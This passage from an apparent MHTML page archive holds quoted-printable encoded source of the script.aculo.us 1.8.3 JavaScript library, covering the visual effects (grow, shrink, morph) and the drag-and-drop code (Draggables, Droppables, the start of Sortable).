      effect.element.undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBott=
om}); }
    }, arguments[1] || { })
  );
};

Effect.SlideUp =3D function(element) {
  element =3D $(element).cleanWhitespace();
  var oldInnerBottom =3D element.down().getStyle('bottom');
  var elementDimensions =3D element.getDimensions();
  return new Effect.Scale(element, window.opera ? 0 : 1,
   Object.extend({ scaleContent: false,
    scaleX: false,
    scaleMode: 'box',
    scaleFrom: 100,
    scaleMode: {originalHeight: elementDimensions.height, originalWidth: el=
ementDimensions.width},
    restoreAfterFinish: true,
    afterSetup: function(effect) {
      effect.element.makePositioned();
      effect.element.down().makePositioned();
      if (window.opera) effect.element.setStyle({top: ''});
      effect.element.makeClipping().show();
    },
    afterUpdateInternal: function(effect) {
      effect.element.down().setStyle({bottom:
        (effect.dims[0] - effect.element.clientHeight) + 'px' });
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping().undoPositioned();
      effect.element.down().undoPositioned().setStyle({bottom: oldInnerBott=
om});
    }
   }, arguments[1] || { })
  );
};

// Bug in opera makes the TD containing this element expand for a instance=
 after finish
Effect.Squish =3D function(element) {
  return new Effect.Scale(element, window.opera ? 1 : 0, {
    restoreAfterFinish: true,
    beforeSetup: function(effect) {
      effect.element.makeClipping();
    },
    afterFinishInternal: function(effect) {
      effect.element.hide().undoClipping();
    }
  });
};

Effect.Grow =3D function(element) {
  element =3D $(element);
  var options =3D Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.full
  }, arguments[1] || { });
  var oldStyle =3D {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims =3D element.getDimensions();
  var initialMoveX, initialMoveY;
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      initialMoveX =3D initialMoveY =3D moveX =3D moveY =3D 0;
      break;
    case 'top-right':
      initialMoveX =3D dims.width;
      initialMoveY =3D moveY =3D 0;
      moveX =3D -dims.width;
      break;
    case 'bottom-left':
      initialMoveX =3D moveX =3D 0;
      initialMoveY =3D dims.height;
      moveY =3D -dims.height;
      break;
    case 'bottom-right':
      initialMoveX =3D dims.width;
      initialMoveY =3D dims.height;
      moveX =3D -dims.width;
      moveY =3D -dims.height;
      break;
    case 'center':
      initialMoveX =3D dims.width / 2;
      initialMoveY =3D dims.height / 2;
      moveX =3D -dims.width / 2;
      moveY =3D -dims.height / 2;
      break;
  }

  return new Effect.Move(element, {
    x: initialMoveX,
    y: initialMoveY,
    duration: 0.01,
    beforeSetup: function(effect) {
      effect.element.hide().makeClipping().makePositioned();
    },
    afterFinishInternal: function(effect) {
      new Effect.Parallel(
        [ new Effect.Opacity(effect.element, { sync: true, to: 1.0, from:=
 0.0, transition: options.opacityTransition }),
          new Effect.Move(effect.element, { x: moveX, y: moveY, sync: true,=
 transition: options.moveTransition }),
          new Effect.Scale(effect.element, 100, {
            scaleMode: { originalHeight: dims.height, originalWidth: dims.w=
idth },
            sync: true, scaleFrom: window.opera ? 1 : 0, transition: option=
s.scaleTransition, restoreAfterFinish: true})
        ], Object.extend({
             beforeSetup: function(effect) {
               effect.effects[0].element.setStyle({height: '0px'}).show();
             },
             afterFinishInternal: function(effect) {
               effect.effects[0].element.undoClipping().undoPositioned().se=
tStyle(oldStyle);
             }
           }, options)
      );
    }
  });
};

Effect.Shrink =3D function(element) {
  element =3D $(element);
  var options =3D Object.extend({
    direction: 'center',
    moveTransition: Effect.Transitions.sinoidal,
    scaleTransition: Effect.Transitions.sinoidal,
    opacityTransition: Effect.Transitions.none
  }, arguments[1] || { });
  var oldStyle =3D {
    top: element.style.top,
    left: element.style.left,
    height: element.style.height,
    width: element.style.width,
    opacity: element.getInlineOpacity() };

  var dims =3D element.getDimensions();
  var moveX, moveY;

  switch (options.direction) {
    case 'top-left':
      moveX =3D moveY =3D 0;
      break;
    case 'top-right':
      moveX =3D dims.width;
      moveY =3D 0;
      break;
    case 'bottom-left':
      moveX =3D 0;
      moveY =3D dims.height;
      break;
    case 'bottom-right':
      moveX =3D dims.width;
      moveY =3D dims.height;
      break;
    case 'center':
      moveX =3D dims.width / 2;
      moveY =3D dims.height / 2;
      break;
  }

  return new Effect.Parallel(
    [ new Effect.Opacity(element, { sync: true, to: 0.0, from: 1.0, transit=
ion: options.opacityTransition }),
      new Effect.Scale(element, window.opera ? 1 : 0, { sync: true, transit=
ion: options.scaleTransition, restoreAfterFinish: true}),
      new Effect.Move(element, { x: moveX, y: moveY, sync: true, transition=
: options.moveTransition })
    ], Object.extend({
         beforeStartInternal: function(effect) {
           effect.effects[0].element.makePositioned().makeClipping();
         },
         afterFinishInternal: function(effect) {
           effect.effects[0].element.hide().undoClipping().undoPositioned()=
.setStyle(oldStyle); }
       }, options)
  );
};

Effect.Pulsate =3D function(element) {
  element =3D $(element);
  var options    =3D arguments[1] || { },
    oldOpacity =3D element.getInlineOpacity(),
    transition =3D options.transition || Effect.Transitions.linear,
    reverser   =3D function(pos){
      return 1 - transition((-Math.cos((pos*(options.pulses||5)*2)*Math.PI)=
/2) + .5);
    };

  return new Effect.Opacity(element,
    Object.extend(Object.extend({  duration: 2.0, from: 0,
      afterFinishInternal: function(effect) { effect.element.setStyle({opac=
ity: oldOpacity}); }
    }, options), {transition: reverser}));
};

Effect.Fold =3D function(element) {
  element =3D $(element);
  var oldStyle =3D {
    top: element.style.top,
    left: element.style.left,
    width: element.style.width,
    height: element.style.height };
  element.makeClipping();
  return new Effect.Scale(element, 5, Object.extend({
    scaleContent: false,
    scaleX: false,
    afterFinishInternal: function(effect) {
    new Effect.Scale(element, 1, {
      scaleContent: false,
      scaleY: false,
      afterFinishInternal: function(effect) {
        effect.element.hide().undoClipping().setStyle(oldStyle);
      } });
  }}, arguments[1] || { }));
};

Effect.Morph =3D Class.create(Effect.Base, {
  initialize: function(element) {
    this.element =3D $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options =3D Object.extend({
      style: { }
    }, arguments[1] || { });

    if (!Object.isString(options.style)) this.style =3D $H(options.style);
    else {
      if (options.style.include(':'))
        this.style =3D options.style.parseStyle();
      else {
        this.element.addClassName(options.style);
        this.style =3D $H(this.element.getStyles());
        this.element.removeClassName(options.style);
        var css =3D this.element.getStyles();
        this.style =3D this.style.reject(function(style) {
          return style.value =3D=3D css[style.key];
        });
        options.afterFinishInternal =3D function(effect) {
          effect.element.addClassName(effect.options.style);
          effect.transforms.each(function(transform) {
            effect.element.style[transform.style] =3D '';
          });
        };
      }
    }
    this.start(options);
  },

  setup: function(){
    function parseColor(color){
      if (!color || ['rgba(0, 0, 0, 0)','transparent'].include(color)) colo=
r =3D '#ffffff';
      color =3D color.parseColor();
      return $R(0,2).map(function(i){
        return parseInt( color.slice(i*2+1,i*2+3), 16 );
      });
    }
    this.transforms =3D this.style.map(function(pair){
      var property =3D pair[0], value =3D pair[1], unit =3D null;

      if (value.parseColor('#zzzzzz') !=3D '#zzzzzz') {
        value =3D value.parseColor();
        unit  =3D 'color';
      } else if (property =3D=3D 'opacity') {
        value =3D parseFloat(value);
        if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
          this.element.setStyle({zoom: 1});
      } else if (Element.CSS_LENGTH.test(value)) {
          var components =3D value.match(/^([\+\-]?[0-9\.]+)(.*)$/);
          value =3D parseFloat(components[1]);
          unit =3D (components.length =3D=3D 3) ? components[2] : null;
      }

      var originalValue =3D this.element.getStyle(property);
      return {
        style: property.camelize(),
        originalValue: unit=3D=3D'color' ? parseColor(originalValue) : pars=
eFloat(originalValue || 0),
        targetValue: unit=3D=3D'color' ? parseColor(value) : value,
        unit: unit
      };
    }.bind(this)).reject(function(transform){
      return (
        (transform.originalValue =3D=3D transform.targetValue) ||
        (
          transform.unit !=3D 'color' &&
          (isNaN(transform.originalValue) || isNaN(transform.targetValue))
        )
      );
    });
  },
  update: function(position) {
    var style =3D { }, transform, i =3D this.transforms.length;
    while(i--)
      style[(transform =3D this.transforms[i]).style] =3D
        transform.unit=3D=3D'color' ? '#'+
          (Math.round(transform.originalValue[0]+
            (transform.targetValue[0]-transform.originalValue[0])*position)=
).toColorPart() +
          (Math.round(transform.originalValue[1]+
            (transform.targetValue[1]-transform.originalValue[1])*position)=
).toColorPart() +
          (Math.round(transform.originalValue[2]+
            (transform.targetValue[2]-transform.originalValue[2])*position)=
).toColorPart() :
        (transform.originalValue +
          (transform.targetValue - transform.originalValue) * position).toF=
ixed(3) +
            (transform.unit =3D=3D=3D null ? '' : transform.unit);
    this.element.setStyle(style, true);
  }
});

Effect.Transform =3D Class.create({
  initialize: function(tracks){
    this.tracks  =3D [];
    this.options =3D arguments[1] || { };
    this.addTracks(tracks);
  },
  addTracks: function(tracks){
    tracks.each(function(track){
      track =3D $H(track);
      var data =3D track.values().first();
      this.tracks.push($H({
        ids:     track.keys().first(),
        effect:  Effect.Morph,
        options: { style: data }
      }));
    }.bind(this));
    return this;
  },
  play: function(){
    return new Effect.Parallel(
      this.tracks.map(function(track){
        var ids =3D track.get('ids'), effect =3D track.get('effect'), optio=
ns =3D track.get('options');
        var elements =3D [$(ids) || $$(ids)].flatten();
        return elements.map(function(e){ return new effect(e, Object.extend=
({ sync:true }, options)) });
      }).flatten(),
      this.options
    );
  }
});

Element.CSS_PROPERTIES =3D $w(
  'backgroundColor backgroundPosition borderBottomColor borderBottomStyle=
 ' +
  'borderBottomWidth borderLeftColor borderLeftStyle borderLeftWidth ' +
  'borderRightColor borderRightStyle borderRightWidth borderSpacing ' +
  'borderTopColor borderTopStyle borderTopWidth bottom clip color ' +
  'fontSize fontWeight height left letterSpacing lineHeight ' +
  'marginBottom marginLeft marginRight marginTop markerOffset maxHeight '+
  'maxWidth minHeight minWidth opacity outlineColor outlineOffset ' +
  'outlineWidth paddingBottom paddingLeft paddingRight paddingTop ' +
  'right textIndent top width wordSpacing zIndex');

Element.CSS_LENGTH =3D /^(([\+\-]?[0-9\.]+)(em|ex|px|in|cm|mm|pt|pc|\%))|0$=
/;

String.__parseStyleElement =3D document.createElement('div');
String.prototype.parseStyle =3D function(){
  var style, styleRules =3D $H();
  if (Prototype.Browser.WebKit)
    style =3D new Element('div',{style:this}).style;
  else {
    String.__parseStyleElement.innerHTML =3D '<div style=3D"' + this + '"><=
/div>';
    style =3D String.__parseStyleElement.childNodes[0].style;
  }

  Element.CSS_PROPERTIES.each(function(property){
    if (style[property]) styleRules.set(property, style[property]);
  });

  if (Prototype.Browser.IE && this.include('opacity'))
    styleRules.set('opacity', this.match(/opacity:\s*((?:0|1)?(?:\.\d*)?)/)=
[1]);

  return styleRules;
};

if (document.defaultView && document.defaultView.getComputedStyle) {
  Element.getStyles =3D function(element) {
    var css =3D document.defaultView.getComputedStyle($(element), null);
    return Element.CSS_PROPERTIES.inject({ }, function(styles, property) {
      styles[property] =3D css[property];
      return styles;
    });
  };
} else {
  Element.getStyles =3D function(element) {
    element =3D $(element);
    var css =3D element.currentStyle, styles;
    styles =3D Element.CSS_PROPERTIES.inject({ }, function(results, propert=
y) {
      results[property] =3D css[property];
      return results;
    });
    if (!styles.opacity) styles.opacity =3D element.getOpacity();
    return styles;
  };
}

Effect.Methods =3D {
  morph: function(element, style) {
    element =3D $(element);
    new Effect.Morph(element, Object.extend({ style: style }, arguments[2]=
 || { }));
    return element;
  },
  visualEffect: function(element, effect, options) {
    element =3D $(element);
    var s =3D effect.dasherize().camelize(), klass =3D s.charAt(0).toUpperC=
ase() + s.substring(1);
    new Effect[klass](element, options);
    return element;
  },
  highlight: function(element, options) {
    element =3D $(element);
    new Effect.Highlight(element, options);
    return element;
  }
};

$w('fade appear grow shrink fold blindUp blindDown slideUp slideDown '+
  'pulsate shake puff squish switchOff dropOut').each(
  function(effect) {
    Effect.Methods[effect] =3D function(element, options){
      element =3D $(element);
      Effect[effect.charAt(0).toUpperCase() + effect.substring(1)](element,=
 options);
      return element;
    };
  }
);

$w('getInlineOpacity forceRerendering setContentZoom collectTextNodes colle=
ctTextNodesIgnoreClass getStyles').each(
  function(f) { Effect.Methods[f] =3D Element[f]; }
);

Element.addMethods(Effect.Methods);
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/dragdrop.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us dragdrop.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Thomas Fuchs (http://script.aculo.us, http://mir=
.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style=
 license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if(Object.isUndefined(Effect))
  throw("dragdrop.js requires including script.aculo.us' effects.js library=
");

var Droppables =3D {
  drops: [],

  remove: function(element) {
    this.drops =3D this.drops.reject(function(d) { return d.element=3D=3D$(=
element) });
  },

  add: function(element) {
    element =3D $(element);
    var options =3D Object.extend({
      greedy:     true,
      hoverclass: null,
      tree:       false
    }, arguments[1] || { });

    // cache containers
    if(options.containment) {
      options._containers =3D [];
      var containment =3D options.containment;
      if(Object.isArray(containment)) {
        containment.each( function(c) { options._containers.push($(c)) });
      } else {
        options._containers.push($(containment));
      }
    }

    if(options.accept) options.accept =3D [options.accept].flatten();

    Element.makePositioned(element); // fix IE
    options.element =3D element;

    this.drops.push(options);
  },

  findDeepestChild: function(drops) {
    deepest =3D drops[0];

    for (i =3D 1; i < drops.length; ++i)
      if (Element.isParent(drops[i].element, deepest.element))
        deepest =3D drops[i];

    return deepest;
  },

  isContained: function(element, drop) {
    var containmentNode;
    if(drop.tree) {
      containmentNode =3D element.treeNode;
    } else {
      containmentNode =3D element.parentNode;
    }
    return drop._containers.detect(function(c) { return containmentNode =3D=
=3D c });
  },

  isAffected: function(point, element, drop) {
    return (
      (drop.element!=3Delement) &&
      ((!drop._containers) ||
        this.isContained(element, drop)) &&
      ((!drop.accept) ||
        (Element.classNames(element).detect(
          function(v) { return drop.accept.include(v) } ) )) &&
      Position.within(drop.element, point[0], point[1]) );
  },

  deactivate: function(drop) {
    if(drop.hoverclass)
      Element.removeClassName(drop.element, drop.hoverclass);
    this.last_active =3D null;
  },

  activate: function(drop) {
    if(drop.hoverclass)
      Element.addClassName(drop.element, drop.hoverclass);
    this.last_active =3D drop;
  },

  show: function(point, element) {
    if(!this.drops.length) return;
    var drop, affected =3D [];

    this.drops.each( function(drop) {
      if(Droppables.isAffected(point, element, drop))
        affected.push(drop);
    });

    if(affected.length>0)
      drop =3D Droppables.findDeepestChild(affected);

    if(this.last_active && this.last_active !=3D drop) this.deactivate(this=
.last_active);
    if (drop) {
      Position.within(drop.element, point[0], point[1]);
      if(drop.onHover)
        drop.onHover(element, drop.element, Position.overlap(drop.overlap,=
 drop.element));

      if (drop !=3D this.last_active) Droppables.activate(drop);
    }
  },

  fire: function(event, element) {
    if(!this.last_active) return;
    Position.prepare();

    if (this.isAffected([Event.pointerX(event), Event.pointerY(event)], ele=
ment, this.last_active))
      if (this.last_active.onDrop) {
        this.last_active.onDrop(element, this.last_active.element, event);
        return true;
      }
  },

  reset: function() {
    if(this.last_active)
      this.deactivate(this.last_active);
  }
};

var Draggables =3D {
  drags: [],
  observers: [],

  register: function(draggable) {
    if(this.drags.length =3D=3D 0) {
      this.eventMouseUp   =3D this.endDrag.bindAsEventListener(this);
      this.eventMouseMove =3D this.updateDrag.bindAsEventListener(this);
      this.eventKeypress  =3D this.keyPress.bindAsEventListener(this);

      Event.observe(document, "mouseup", this.eventMouseUp);
      Event.observe(document, "mousemove", this.eventMouseMove);
      Event.observe(document, "keypress", this.eventKeypress);
    }
    this.drags.push(draggable);
  },

  unregister: function(draggable) {
    this.drags =3D this.drags.reject(function(d) { return d=3D=3Ddraggable=
 });
    if(this.drags.length =3D=3D 0) {
      Event.stopObserving(document, "mouseup", this.eventMouseUp);
      Event.stopObserving(document, "mousemove", this.eventMouseMove);
      Event.stopObserving(document, "keypress", this.eventKeypress);
    }
  },

  activate: function(draggable) {
    if(draggable.options.delay) {
      this._timeout =3D setTimeout(function() {
        Draggables._timeout =3D null;
        window.focus();
        Draggables.activeDraggable =3D draggable;
      }.bind(this), draggable.options.delay);
    } else {
      window.focus(); // allows keypress events if window isn't currently=
 focused, fails for Safari
      this.activeDraggable =3D draggable;
    }
  },

  deactivate: function() {
    this.activeDraggable =3D null;
  },

  updateDrag: function(event) {
    if(!this.activeDraggable) return;
    var pointer =3D [Event.pointerX(event), Event.pointerY(event)];
    // Mozilla-based browsers fire successive mousemove events with
    // the same coordinates, prevent needless redrawing (moz bug?)
    if(this._lastPointer && (this._lastPointer.inspect() =3D=3D pointer.ins=
pect())) return;
    this._lastPointer =3D pointer;

    this.activeDraggable.updateDrag(event, pointer);
  },

  endDrag: function(event) {
    if(this._timeout) {
      clearTimeout(this._timeout);
      this._timeout =3D null;
    }
    if(!this.activeDraggable) return;
    this._lastPointer =3D null;
    this.activeDraggable.endDrag(event);
    this.activeDraggable =3D null;
  },

  keyPress: function(event) {
    if(this.activeDraggable)
      this.activeDraggable.keyPress(event);
  },

  addObserver: function(observer) {
    this.observers.push(observer);
    this._cacheObserverCallbacks();
  },

  removeObserver: function(element) {  // element instead of observer fixes=
 mem leaks
    this.observers =3D this.observers.reject( function(o) { return o.elemen=
t=3D=3Delement });
    this._cacheObserverCallbacks();
  },

  notify: function(eventName, draggable, event) {  // 'onStart', 'onEnd',=
 'onDrag'
    if(this[eventName+'Count'] > 0)
      this.observers.each( function(o) {
        if(o[eventName]) o[eventName](eventName, draggable, event);
      });
    if(draggable.options[eventName]) draggable.options[eventName](draggable=
, event);
  },

  _cacheObserverCallbacks: function() {
    ['onStart','onEnd','onDrag'].each( function(eventName) {
      Draggables[eventName+'Count'] =3D Draggables.observers.select(
        function(o) { return o[eventName]; }
      ).length;
    });
  }
};

/*-------------------------------------------------------------------------=
-*/

var Draggable =3D Class.create({
  initialize: function(element) {
    var defaults =3D {
      handle: false,
      reverteffect: function(element, top_offset, left_offset) {
        var dur =3D Math.sqrt(Math.abs(top_offset^2)+Math.abs(left_offset^2=
))*0.02;
        new Effect.Move(element, { x: -left_offset, y: -top_offset, duratio=
n: dur,
          queue: {scope:'_draggable', position:'end'}
        });
      },
      endeffect: function(element) {
        var toOpacity =3D Object.isNumber(element._opacity) ? element._opac=
ity : 1.0;
        new Effect.Opacity(element, {duration:0.2, from:0.7, to:toOpacity,
          queue: {scope:'_draggable', position:'end'},
          afterFinish: function(){
            Draggable._dragging[element] =3D false
          }
        });
      },
      zindex: 1000,
      revert: false,
      quiet: false,
      scroll: false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      snap: false,  // false, or xy or [x,y] or function(x,y){ return [x,y]=
 }
      delay: 0
    };

    if(!arguments[1] || Object.isUndefined(arguments[1].endeffect))
      Object.extend(defaults, {
        starteffect: function(element) {
          element._opacity =3D Element.getOpacity(element);
          Draggable._dragging[element] =3D true;
          new Effect.Opacity(element, {duration:0.2, from:element._opacity,=
 to:0.7});
        }
      });

    var options =3D Object.extend(defaults, arguments[1] || { });

    this.element =3D $(element);

    if(options.handle && Object.isString(options.handle))
      this.handle =3D this.element.down('.'+options.handle, 0);

    if(!this.handle) this.handle =3D $(options.handle);
    if(!this.handle) this.handle =3D this.element;

    if(options.scroll && !options.scroll.scrollTo && !options.scroll.outerH=
TML) {
      options.scroll =3D $(options.scroll);
      this._isScrollChild =3D Element.childOf(this.element, options.scroll);
    }

    Element.makePositioned(this.element); // fix IE

    this.options  =3D options;
    this.dragging =3D false;

    this.eventMouseDown =3D this.initDrag.bindAsEventListener(this);
    Event.observe(this.handle, "mousedown", this.eventMouseDown);

    Draggables.register(this);
  },

  destroy: function() {
    Event.stopObserving(this.handle, "mousedown", this.eventMouseDown);
    Draggables.unregister(this);
  },

  currentDelta: function() {
    return([
      parseInt(Element.getStyle(this.element,'left') || '0'),
      parseInt(Element.getStyle(this.element,'top') || '0')]);
  },

  initDrag: function(event) {
    if(!Object.isUndefined(Draggable._dragging[this.element]) &&
      Draggable._dragging[this.element]) return;
    if(Event.isLeftClick(event)) {
      // abort on form elements, fixes a Firefox issue
      var src =3D Event.element(event);
      if((tag_name =3D src.tagName.toUpperCase()) && (
        tag_name=3D=3D'INPUT' ||
        tag_name=3D=3D'SELECT' ||
        tag_name=3D=3D'OPTION' ||
        tag_name=3D=3D'BUTTON' ||
        tag_name=3D=3D'TEXTAREA')) return;

      var pointer =3D [Event.pointerX(event), Event.pointerY(event)];
      var pos     =3D this.element.cumulativeOffset();
      this.offset =3D [0,1].map( function(i) { return (pointer[i] - pos[i])=
 });

      Draggables.activate(this);
      Event.stop(event);
    }
  },

  startDrag: function(event) {
    this.dragging =3D true;
    if(!this.delta)
      this.delta =3D this.currentDelta();

    if(this.options.zindex) {
      this.originalZ =3D parseInt(Element.getStyle(this.element,'z-index')=
 || 0);
      this.element.style.zIndex =3D this.options.zindex;
    }

    if(this.options.ghosting) {
      this._clone =3D this.element.cloneNode(true);
      this._originallyAbsolute =3D (this.element.getStyle('position') =3D=
=3D 'absolute');
      if (!this._originallyAbsolute)
        Position.absolutize(this.element);
      this.element.parentNode.insertBefore(this._clone, this.element);
    }

    if(this.options.scroll) {
      if (this.options.scroll =3D=3D window) {
        var where =3D this._getWindowScroll(this.options.scroll);
        this.originalScrollLeft =3D where.left;
        this.originalScrollTop =3D where.top;
      } else {
        this.originalScrollLeft =3D this.options.scroll.scrollLeft;
        this.originalScrollTop =3D this.options.scroll.scrollTop;
      }
    }

    Draggables.notify('onStart', this, event);

    if(this.options.starteffect) this.options.starteffect(this.element);
  },

  updateDrag: function(event, pointer) {
    if(!this.dragging) this.startDrag(event);

    if(!this.options.quiet){
      Position.prepare();
      Droppables.show(pointer, this.element);
    }

    Draggables.notify('onDrag', this, event);

    this.draw(pointer);
    if(this.options.change) this.options.change(this);

    if(this.options.scroll) {
      this.stopScrolling();

      var p;
      if (this.options.scroll =3D=3D window) {
        with(this._getWindowScroll(this.options.scroll)) { p =3D [ left, to=
p, left+width, top+height ]; }
      } else {
        p =3D Position.page(this.options.scroll);
        p[0] +=3D this.options.scroll.scrollLeft + Position.deltaX;
        p[1] +=3D this.options.scroll.scrollTop + Position.deltaY;
        p.push(p[0]+this.options.scroll.offsetWidth);
        p.push(p[1]+this.options.scroll.offsetHeight);
      }
      var speed =3D [0,0];
      if(pointer[0] < (p[0]+this.options.scrollSensitivity)) speed[0] =3D=
 pointer[0]-(p[0]+this.options.scrollSensitivity);
      if(pointer[1] < (p[1]+this.options.scrollSensitivity)) speed[1] =3D=
 pointer[1]-(p[1]+this.options.scrollSensitivity);
      if(pointer[0] > (p[2]-this.options.scrollSensitivity)) speed[0] =3D=
 pointer[0]-(p[2]-this.options.scrollSensitivity);
      if(pointer[1] > (p[3]-this.options.scrollSensitivity)) speed[1] =3D=
 pointer[1]-(p[3]-this.options.scrollSensitivity);
      this.startScrolling(speed);
    }

    // fix AppleWebKit rendering
    if(Prototype.Browser.WebKit) window.scrollBy(0,0);

    Event.stop(event);
  },

  finishDrag: function(event, success) {
    this.dragging =3D false;

    if(this.options.quiet){
      Position.prepare();
      var pointer =3D [Event.pointerX(event), Event.pointerY(event)];
      Droppables.show(pointer, this.element);
    }

    if(this.options.ghosting) {
      if (!this._originallyAbsolute)
        Position.relativize(this.element);
      delete this._originallyAbsolute;
      Element.remove(this._clone);
      this._clone =3D null;
    }

    var dropped =3D false;
    if(success) {
      dropped =3D Droppables.fire(event, this.element);
      if (!dropped) dropped =3D false;
    }
    if(dropped && this.options.onDropped) this.options.onDropped(this.eleme=
nt);
    Draggables.notify('onEnd', this, event);

    var revert =3D this.options.revert;
    if(revert && Object.isFunction(revert)) revert =3D revert(this.element);

    var d =3D this.currentDelta();
    if(revert && this.options.reverteffect) {
      if (dropped =3D=3D 0 || revert !=3D 'failure')
        this.options.reverteffect(this.element,
          d[1]-this.delta[1], d[0]-this.delta[0]);
    } else {
      this.delta =3D d;
    }

    if(this.options.zindex)
      this.element.style.zIndex =3D this.originalZ;

    if(this.options.endeffect)
      this.options.endeffect(this.element);

    Draggables.deactivate(this);
    Droppables.reset();
  },

  keyPress: function(event) {
    if(event.keyCode!=3DEvent.KEY_ESC) return;
    this.finishDrag(event, false);
    Event.stop(event);
  },

  endDrag: function(event) {
    if(!this.dragging) return;
    this.stopScrolling();
    this.finishDrag(event, true);
    Event.stop(event);
  },

  draw: function(point) {
    var pos =3D this.element.cumulativeOffset();
    if(this.options.ghosting) {
      var r   =3D Position.realOffset(this.element);
      pos[0] +=3D r[0] - Position.deltaX; pos[1] +=3D r[1] - Position.delta=
Y;
    }

    var d =3D this.currentDelta();
    pos[0] -=3D d[0]; pos[1] -=3D d[1];

    if(this.options.scroll && (this.options.scroll !=3D window && this._isS=
crollChild)) {
      pos[0] -=3D this.options.scroll.scrollLeft-this.originalScrollLeft;
      pos[1] -=3D this.options.scroll.scrollTop-this.originalScrollTop;
    }

    var p =3D [0,1].map(function(i){
      return (point[i]-pos[i]-this.offset[i])
    }.bind(this));

    if(this.options.snap) {
      if(Object.isFunction(this.options.snap)) {
        p =3D this.options.snap(p[0],p[1],this);
      } else {
      if(Object.isArray(this.options.snap)) {
        p =3D p.map( function(v, i) {
          return (v/this.options.snap[i]).round()*this.options.snap[i] }.bi=
nd(this));
      } else {
        p =3D p.map( function(v) {
          return (v/this.options.snap).round()*this.options.snap }.bind(thi=
s));
      }
    }}

    var style =3D this.element.style;
    if((!this.options.constraint) || (this.options.constraint=3D=3D'horizon=
tal'))
      style.left =3D p[0] + "px";
    if((!this.options.constraint) || (this.options.constraint=3D=3D'vertica=
l'))
      style.top  =3D p[1] + "px";

    if(style.visibility=3D=3D"hidden") style.visibility =3D ""; // fix geck=
o rendering
  },

  stopScrolling: function() {
    if(this.scrollInterval) {
      clearInterval(this.scrollInterval);
      this.scrollInterval =3D null;
      Draggables._lastScrollPointer =3D null;
    }
  },

  startScrolling: function(speed) {
    if(!(speed[0] || speed[1])) return;
    this.scrollSpeed =3D [speed[0]*this.options.scrollSpeed,speed[1]*this.o=
ptions.scrollSpeed];
    this.lastScrolled =3D new Date();
    this.scrollInterval =3D setInterval(this.scroll.bind(this), 10);
  },

  scroll: function() {
    var current =3D new Date();
    var delta =3D current - this.lastScrolled;
    this.lastScrolled =3D current;
    if(this.options.scroll =3D=3D window) {
      with (this._getWindowScroll(this.options.scroll)) {
        if (this.scrollSpeed[0] || this.scrollSpeed[1]) {
          var d =3D delta / 1000;
          this.options.scroll.scrollTo( left + d*this.scrollSpeed[0], top=
 + d*this.scrollSpeed[1] );
        }
      }
    } else {
      this.options.scroll.scrollLeft +=3D this.scrollSpeed[0] * delta / 100=
0;
      this.options.scroll.scrollTop  +=3D this.scrollSpeed[1] * delta / 100=
0;
    }

    Position.prepare();
    Droppables.show(Draggables._lastPointer, this.element);
    Draggables.notify('onDrag', this);
    if (this._isScrollChild) {
      Draggables._lastScrollPointer =3D Draggables._lastScrollPointer || $A=
(Draggables._lastPointer);
      Draggables._lastScrollPointer[0] +=3D this.scrollSpeed[0] * delta /=
 1000;
      Draggables._lastScrollPointer[1] +=3D this.scrollSpeed[1] * delta /=
 1000;
      if (Draggables._lastScrollPointer[0] < 0)
        Draggables._lastScrollPointer[0] =3D 0;
      if (Draggables._lastScrollPointer[1] < 0)
        Draggables._lastScrollPointer[1] =3D 0;
      this.draw(Draggables._lastScrollPointer);
    }

    if(this.options.change) this.options.change(this);
  },

  _getWindowScroll: function(w) {
    var T, L, W, H;
    with (w.document) {
      if (w.document.documentElement && documentElement.scrollTop) {
        T =3D documentElement.scrollTop;
        L =3D documentElement.scrollLeft;
      } else if (w.document.body) {
        T =3D body.scrollTop;
        L =3D body.scrollLeft;
      }
      if (w.innerWidth) {
        W =3D w.innerWidth;
        H =3D w.innerHeight;
      } else if (w.document.documentElement && documentElement.clientWidth)=
 {
        W =3D documentElement.clientWidth;
        H =3D documentElement.clientHeight;
      } else {
        W =3D body.offsetWidth;
        H =3D body.offsetHeight;
      }
    }
    return { top: T, left: L, width: W, height: H };
  }
});

Draggable._dragging =3D { };

/*-------------------------------------------------------------------------=
-*/

var SortableObserver =3D Class.create({
  initialize: function(element, observer) {
    this.element   =3D $(element);
    this.observer  =3D observer;
    this.lastValue =3D Sortable.serialize(this.element);
  },

  onStart: function() {
    this.lastValue =3D Sortable.serialize(this.element);
  },

  onEnd: function() {
    Sortable.unmark();
    if(this.lastValue !=3D Sortable.serialize(this.element))
      this.observer(this.element)
  }
});

var Sortable =3D {
  SERIALIZE_RULE: /^[^_\-](?:[A-Za-z0-9\-\_]*)[_](.*)$/,

  sortables: { },

  _findRootElement: function(element) {
    while (element.tagName.toUpperCase() !=3D "BODY") {
      if(element.id && Sortable.sortables[element.id]) return element;
      element =3D element.parentNode;
    }
  },

  options: function(element) {
    element =3D Sortable._findRootElement($(element));
    if(!element) return;
    return Sortable.sortables[element.id];
  },

  destroy: function(element){
    element =3D $(element);
    var s =3D Sortable.sortables[element.id];

    if(s) {
      Draggables.removeObserver(s.element);
      s.droppables.each(function(d){ Droppables.remove(d) });
      s.draggables.invoke('destroy');

      delete Sortable.sortables[s.element.id];
    }
  },

  create: function(element) {
    element =3D $(element);
    var options =3D Object.extend({
      element:     element,
      tag:         'li',       // assumes li children, override with tag:=
 'tagname'
      dropOnEmpty: false,
      tree:        false,
      treeTag:     'ul',
      overlap:     'vertical', // one of 'vertical', 'horizontal'
      constraint:  'vertical', // one of 'vertical', 'horizontal', false
      containment: element,    // also takes array of elements (or id's);=
 or false
      handle:      false,      // or a CSS class
